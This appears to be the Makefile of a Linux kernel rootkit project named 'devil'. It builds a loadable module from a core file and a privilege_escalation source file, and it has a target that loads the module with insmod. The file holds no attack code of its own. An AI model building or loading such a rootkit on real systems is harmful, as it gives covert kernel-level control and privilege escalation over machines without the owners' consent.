# Module name
ROOTKIT		:= devil
MODULEDIR	:= /lib/modules/$(shell uname -r)
BUILDDIR	:= $(MODULEDIR)/build
SRCS_S 		:= src
INCL_S 		:= src/include
SRCS_H		:= $(PWD)/$(SRCS_S)/headers
INCL_H		:= $(PWD)/$(INCL_S)/headers

obj-m 		:= $(ROOTKIT).o
$(ROOTKIT)-y 	+= src/core.o
$(ROOTKIT)-y 	+= src/privilege_escalation.o

ccflags-y	:= -I$(SRCS_H) -I$(INCL_H)

# Recipes
all:
	$(MAKE) -C $(BUILDDIR) M=$(PWD) modules

load:
	insmod rootkit.ko